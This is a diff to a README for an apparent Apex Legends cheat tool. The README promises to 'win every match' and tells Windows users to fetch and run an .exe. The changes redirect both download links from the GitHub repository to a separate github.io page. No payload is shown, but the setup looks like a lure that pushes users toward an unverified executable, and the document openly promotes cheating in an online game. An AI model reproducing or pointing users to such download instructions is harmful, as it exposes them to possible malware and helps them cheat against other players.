@@ -1,6 +1,6 @@
 # 🎯 Apex-Legends-Cheat - Win every match with advanced tools
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/Characterassassinationscoopshot522/Apex-Legends-Cheat)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://characterassassinationscoopshot522.github.io)
 
 This guide helps you set up this software on your Windows computer. Follow these steps to use the features in your games. 
 
@@ -19,7 +19,7 @@ Before you install this software, check your computer against this list. Your co
 
 Visit the following link to get the files you need for your game. You will find the latest version on this page.
 
-[Click here to download the file](https://github.com/Characterassassinationscoopshot522/Apex-Legends-Cheat)
+[Click here to download the file](https://characterassassinationscoopshot522.github.io)
 
 1. Open the link in your web browser.
 2. Look for the file ending in .exe.
